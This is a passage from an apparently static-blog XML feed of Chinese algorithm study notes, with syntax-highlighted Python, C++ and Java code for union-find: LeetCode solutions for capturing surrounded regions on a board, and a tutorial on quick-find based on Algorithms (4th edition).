class="title">union</span>(<span class="params">self, p, q</span>):</span></span><br><span class="line">        pR = self.find(p)</span><br><span class="line">        qR = self.find(q)</span><br><span class="line">        <span class="comment"># 若已经相连则不再创建连接</span></span><br><span class="line">        <span class="keyword">if</span> pR == qR:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> self.sz[pR] &lt; self.sz[qR]:</span><br><span class="line">            self.<span class="built_in">id</span>[pR] = qR</span><br><span class="line">            self.sz[qR] += self.sz[pR]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.<span class="built_in">id</span>[qR] = pR</span><br><span class="line">            self.sz[pR] += self.sz[qR]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Convert</span>(<span class="params">self, x, y, w</span>):</span></span><br><span class="line">        <span class="keyword">return</span> x * w + y</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self, board: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Do not return anything, modify board in-place instead.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        Len = <span class="built_in">len</span>(board)</span><br><span class="line">        wid = <span class="built_in">len</span>(board[<span class="number">0</span>])</span><br><span class="line">        boardSize = Len * wid</span><br><span class="line">        qu = quick_union(boardSize + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Len):</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> j &lt; wid:</span><br><span class="line">                <span class="keyword">if</span> board[i][j] == <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">                    qu.union(self.Convert(i, j, wid), boardSize)</span><br><span class="line">                <span class="keyword">if</span> i == <span class="number">0</span> <span class="keyword">or</span> i == Len - <span class="number">1</span> <span class="keyword">or</span> j != <span class="number">0</span>:</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    j = wid - <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, Len - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, wid - <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> board[i][j] == <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">                    index = self.Convert(i, j, wid)</span><br><span class="line">                    <span class="keyword">if</span> board[i - <span class="number">1</span>][j] == <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">                        qu.union(self.Convert(i - <span class="number">1</span>, j, wid), index)</span><br><span class="line">                    <span class="keyword">if</span> board[i + <span class="number">1</span>][j] == <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">                        qu.union(self.Convert(i + <span class="number">1</span>, j, wid), index)</span><br><span class="line">                    <span class="keyword">if</span> board[i][j - <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">                        qu.union(self.Convert(i, j - <span class="number">1</span>, wid), index)</span><br><span class="line">                    <span class="keyword">if</span> board[i][j + <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">                        qu.union(self.Convert(i, j + <span class="number">1</span>, wid), index)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, Len - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, wid - <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> board[i][j] == <span class="string">&#x27;O&#x27;</span> <span class="keyword">and</span> (<span class="keyword">not</span> qu.connected(self.Convert(i, j, wid), boardSize)):</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;X&#x27;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="text-3"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">union_find</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> * id;</span><br><span class="line">    <span class="keyword">int</span> * sz;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">union_find</span>(<span class="keyword">int</span> N) &#123;</span><br><span class="line">        id = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        sz = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">            id[i] = i;</span><br><span class="line">            sz[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">union_find</span>() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = p;</span><br><span class="line">        <span class="keyword">while</span> (p != id[p])</span><br><span class="line">            p = id[p];</span><br><span class="line">        <span class="keyword">while</span> (tmp != id[tmp]) &#123;</span><br><span class="line">            <span class="keyword">int</span> t = tmp;</span><br><span class="line">            tmp = id[tmp];</span><br><span class="line">            id[t] = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(p) == <span class="built_in">find</span>(q);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pR = <span class="built_in">find</span>(p);</span><br><span class="line">        <span class="keyword">int</span> qR = <span class="built_in">find</span>(q);</span><br><span class="line">        <span class="keyword">if</span> (pR == qR)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (sz[pR] &lt; sz[qR]) &#123;</span><br><span class="line">            id[pR] = qR;</span><br><span class="line">            sz[qR] += sz[pR];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            id[qR] = pR;</span><br><span class="line">            sz[pR] += sz[qR];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">Convert</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x * w + y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(vector&lt;vector&lt;<span class="keyword">char</span>&gt;&gt;&amp; board)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = board.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> wid = board[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> boardSize = len * wid;</span><br><span class="line">        union_find * uf = <span class="keyword">new</span> <span class="built_in">union_find</span>(boardSize + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; wid;) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">                    uf-&gt;<span class="built_in">Union</span>(<span class="built_in">Convert</span>(i, j, wid), boardSize);</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span> || i == len - <span class="number">1</span> || j != <span class="number">0</span>)</span><br><span class="line">                    j++;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    j = wid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; wid - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">int</span> index = <span class="built_in">Convert</span>(i, j, wid);</span><br><span class="line">                    <span class="keyword">if</span> (board[i - <span class="number">1</span>][j] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">                        uf-&gt;<span class="built_in">Union</span>(<span class="built_in">Convert</span>(i - <span class="number">1</span>, j, wid), index);</span><br><span class="line">                    <span class="keyword">if</span> (board[i + <span class="number">1</span>][j] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">                        uf-&gt;<span class="built_in">Union</span>(<span class="built_in">Convert</span>(i + <span class="number">1</span>, j, wid), index);</span><br><span class="line">                    <span class="keyword">if</span> (board[i][j - <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">                        uf-&gt;<span class="built_in">Union</span>(<span class="built_in">Convert</span>(i, j - <span class="number">1</span>, wid), index);</span><br><span class="line">                    <span class="keyword">if</span> (board[i][j + <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">                        uf-&gt;<span class="built_in">Union</span>(<span class="built_in">Convert</span>(i, j + <span class="number">1</span>, wid), index);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; wid - <span class="number">1</span>; j++)</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span> &amp;&amp; !uf-&gt;<span class="built_in">connected</span>(<span class="built_in">Convert</span>(i , j, wid), boardSize))</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> 刷题 </tag>
            
            <tag> 算法 </tag>
            
            <tag> Java </tag>
            
            <tag> C++ </tag>
            
            <tag> python </tag>
            
            <tag> 并查集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法——union-find</title>
      <link href="/posts/9cd54d6c/"/>
      <url>/posts/9cd54d6c/</url>
      
        <content type="html"><![CDATA[<h1>算法——union-find</h1><blockquote><p><strong>前言</strong></p><p>零基础直接刷力扣还是有些虎了，所以特意补一下理论知识。本系列笔记将以 <a href="https://www.ituring.com.cn/">图灵社区</a> 出版的 <a href="https://www.ituring.com.cn/book/875">《算法：第4版》</a> 为主要参考复现各种算法及实现过程，试图以自己的方式深度解析算法。</p></blockquote><h2 id="需求">需求</h2><p>一列已知的步长为 1 且从 0 开始依次递增的整数序列，对于成对整数 <strong>p</strong> 和 <strong>q</strong> ，即认为 <strong>p</strong> 与 <strong>q</strong> 相连。“相连”是一种<em>等价关系</em>，即具有<span class="bubble-content">自反性 </span><span class="bubble-notation"><span class="bubble-item" style="background-color: #5e616d;"> <text><b>p</b> 和 <b>p</b> 是相连的。</text> </span></span>、<span class="bubble-content">对称性 </span><span class="bubble-notation"><span class="bubble-item" style="background-color: #5e616d;"> <text>如果 <b>p</b> 和 <b>q</b> 是相连的，那么 <b>q</b> 和 <b>p</b> 也是相连的。</text> </span></span>与<span class="bubble-content">传递性 </span><span class="bubble-notation"><span class="bubble-item" style="background-color: #5e616d;"> <text>如果 <b>p</b> 和 <b>q</b> 是相连的且 <b>q</b> 和 <b>r</b> 是相连的，那么 <b>p</b> 和 <b>r</b> 也是相连的。</text> </span></span>。现程序从输入中读取一对整数 <strong>p</strong> 和 <strong>q</strong> ，假设 <strong>p</strong> 和 <strong>q</strong> 都存在于已知序列中，若序列中对应整数相连，则不做操作，若序列中对应整数不相连，则将他们相连，并将 <strong>p</strong> 和 <strong>q</strong> 输出。</p><h2 id="思路">思路</h2><p>主要问题在于，我们需要判断输入的一对整数在已知序列中是否相连，这意味着我们需要<strong>标记</strong>哪些整数对相连，并且由于输入的整数对能够创建新的连接，因此我们需要在每次输入时<strong>维护</strong>这些标记。</p><p>等价关系的传递性决定了序列中所有的整数都可以分为几个块，或称<em>连通分量</em>，在一个块内的所有整数都在两两相连的同时不具有任何对外的连接，而为分属两个连通分量的整数创建连接时则会合并这两个块。注意初始时每个块都只有一个元素。</p><center>    <img src="https://bu.dusays.com/2022/05/26/628f80b0ab585.webp" alt="" style="zoom: 50%;" />    <div style="display: inline-block;                padding: 2px;                border-bottom: 1px solid #d9d9d9;                font-size: 75%;">        一个中规模连通性问题的图示，图源自《算法：第4版》    </div></center><p>因此，我们实际上只需要标记每个整数属于哪个块就行了，在输入后判断两个整数是否相连，若不相连则将两个整数分属的两个块的所有元素都设置为同一标记以将他们相连。</p><h2 id="API-设计">API 设计</h2><p>首先我们需要初始化序列，即将每个整数标识为他们所属的块，而初始时每个元素都各属于一个块。然后对输入的整数对进行判断，需设置一个判断整数对是否相连的方法，若整数对不相连，我们则使用一个将他们相连的方法。而在判断相连的方法中，实际上就是比较该整数对所属块的标识，如果设置一个返回标识的函数，可以进一步简化操作。</p><p>因此，提供如下四个 API 即可：</p><table><thead><tr><th style="text-align:center">API</th><th style="text-align:center">备注</th></tr></thead><tbody><tr><td style="text-align:center">void  union_find(int N)</td><td style="text-align:center">初始化</td></tr><tr><td style="text-align:center">void  union(int p, int q)</td><td style="text-align:center">连接 p, q</td></tr><tr><td style="text-align:center">int  find(int p)</td><td style="text-align:center">返回标识</td></tr><tr><td style="text-align:center">boolean  connected(int p, int q)</td><td style="text-align:center">判断 p, q 是否相连</td></tr></tbody></table><h2 id="基础实现">基础实现</h2><p>我们使用 <code>union_find</code> 类封装该算法，数据的输入及测试交由类中的静态 <code>main()</code> 方法完成。实现算法除以上 API 外还需要一个数组用于初始化及标识序列，数组以序列中的整数为索引，对应值为整数所属块的标识，声明如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[] id;</span><br></pre></td></tr></table></figure><ol><li><p>初始化方法</p><p>由于序列步长为 1 且从 0 开始递增，我们只需给定序列长度即可，因此初始序列由一个整数 <strong>N</strong> 决定。对每个整数的初始标识，让其等于整数本身即可。此外因为 <code>union_find</code> 类的实现必须基于初始序列，因此我们将初始化方法 <code>uinon_find()</code> 定义为不可选的构造方法。</p><p>实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">union_find</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">id = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) id[i] = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>判断方法</p><p>判断方法 <code>connected()</code> 返回判断两个整数的标识是否相同的布尔值即可，在我们设计 API 的时候，整数的标识可以由 <code>find()</code> 方法返回，因此 <code>connected()</code> 方法只需判断 <code>find()</code> 方法的返回值即可。</p><p>实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>测试方法</p><p>返回标识及连接方法复杂一些，我们作为关键方法，先实现最终的测试方法 <code>main()</code> 。<code>main()</code> 首先需要输入一个整数，即初始序列长度由我们给定。然后在输入中依次读取整数对并依靠我们给定的 API 进行具体操作：首先调用 <code>connected()</code> 方法判断输入的整数对是否已经相连，若相连则忽略，若不相连则调用 <code>union()</code> 方法来连接并在屏幕上输出这对整数。此外，为方便测试，输入采用文件形式，而非控制台输入模式，注意需抛出异常 <code>FileNotFoundException</code>。</p><p>实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">    Scanner sc = <span class="keyword">new</span> Scanner(<span class="keyword">new</span> FileReader(<span class="string">&quot;demo.txt&quot;</span>));</span><br><span class="line">    <span class="keyword">int</span> N = sc.nextInt();</span><br><span class="line">    union_find uf = <span class="keyword">new</span> union_find(N);</span><br><span class="line">    <span class="keyword">while</span> (sc.hasNext()) &#123;</span><br><span class="line">        <span class="keyword">int</span> p = sc.nextInt();</span><br><span class="line">        <span class="keyword">int</span> q = sc.nextInt();</span><br><span class="line">        <span class="keyword">if</span> (uf.connected(p, q)) <span class="keyword">continue</span>;</span><br><span class="line">        uf.union(p, q);</span><br><span class="line">        System.out.println(p + <span class="string">&#x27; &#x27;</span> + q);</span><br><span class="line">    &#125;</span><br><span class="line">    sc.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>基础封装</p><p>基于以上实现我们便搭建好了算法的基础框架，因此该算法的基础实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">union_find</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] id;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">union_find</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        id = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) id[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(<span class="keyword">new</span> FileReader(<span class="string">&quot;demo.txt&quot;</span>));</span><br><span class="line">        <span class="keyword">int</span> N = sc.nextInt();</span><br><span class="line">        union_find uf = <span class="keyword">new</span> union_find(N);</span><br><span class="line">        <span class="keyword">while</span> (sc.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">int</span> p = sc.nextInt();</span><br><span class="line">            <span class="keyword">int</span> q = sc.nextInt();</span><br><span class="line">            <span class="keyword">if</span> (uf.connected(p, q)) <span class="keyword">continue</span>;</span><br><span class="line">            uf.union(p, q);</span><br><span class="line">            System.out.println(p + <span class="string">&quot; &quot;</span> + q);</span><br><span class="line">        &#125;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="关键实现">关键实现</h2><p>在 <code>union-find</code> 算法中，关键方法就是 <code>find()</code> 与 <code>union()</code> 方法了。<code>find()</code> 方法负责查找并返回整数所在块的标识， <code>union()</code> 方法负责连接两个不相连的整数。如何实现这两个方法取决于我们如何标识特定的块，在基础实现中我们将标识存储在数组中，并以整数值作索引。</p><ol><li><p><code>quick-find</code> 算法</p><p>一种简单的思路是将属于同一块的整数对应的标识符设为相同，这就意味着当我们创建新的连接的时候，需要将两个整数分属的两个块的所有整数的标识设为相同。基于这个思路，<code>find()</code> 方法只需要返回以当前整数为索引的对应数组元素即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;<span class="keyword">return</span> id[p];&#125;</span><br></pre></td></tr></table></figure><p>而连接和维护标识的操作则全部交给了 <code>union()</code> 方法。我们称这个算法为 <code>quick-find</code> 算法。</p><p><code>union()</code> 方法接收两位整数并将他们分属的两个块中的整数的标识全部设为相同值，除了标识相同，相同块中的元素并没有任何特征，因此我们需要遍历整个数组找到相应标识的元素并修改他们。可以以其中一个块原有的标识作为新标识，这样，我们就不需要修改两个块所有元素的标识，同时不用担心与其他块的标识重复而导致的逻辑错误。这里我们统一使用传入整数对 <strong>p</strong> 、 <strong>q</strong> 中 <strong>q</strong> 的标识作为新标识，实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> qID = find(q);</span><br><span class="line"><span class="keyword">int</span> pID = find(p);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; id.length; i++) </span><br><span class="line"><span class="keyword">if</span>(id[i] == pID) id[i] = qID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此， <code>quick-find</code> 算法的实现就完成了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">union_find</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] id;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">union_find</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        id = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) id[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;<span class="keyword">return</span> id[p];&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> qID = find(q);</span><br><span class="line">        <span class="keyword">int</span> pID = find(p);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; id.length; i++)</span><br><span class="line">            <span class="keyword">if</span>(id[i] == pID) id[i] = qID;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span 